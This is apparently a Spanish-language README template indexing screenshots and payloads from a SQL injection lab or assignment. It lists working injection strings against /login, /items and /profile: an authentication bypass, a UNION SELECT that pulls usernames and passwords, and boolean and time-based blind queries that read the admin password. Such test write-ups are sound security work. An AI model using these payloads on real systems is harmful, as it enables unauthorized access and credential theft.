# README_evidencias

Este archivo explica cada evidencia incluida en la carpeta `evidencias/screenshots/` y los payloads usados (en `evidencias/payloads/`).

--

1) login_bypass_01.png
- Fecha / hora: YYYY-MM-DD HH:MM
- Endpoint probado: POST /login
- Payload usado:
```
admin' --
' OR '1'='1' --
```

2) union_01.png
- Endpoint probado: GET /items?id=1
- Payload usado:
```
1 UNION SELECT 1, username, password FROM users --
```

3) blind_01.png
- Endpoint probado: GET /profile?id=1
- Payload used (boolean/time):
```
1' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' --
1' AND IF(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
```

Asegúrate de sustituir las fechas y observaciones por las reales antes de entregar.
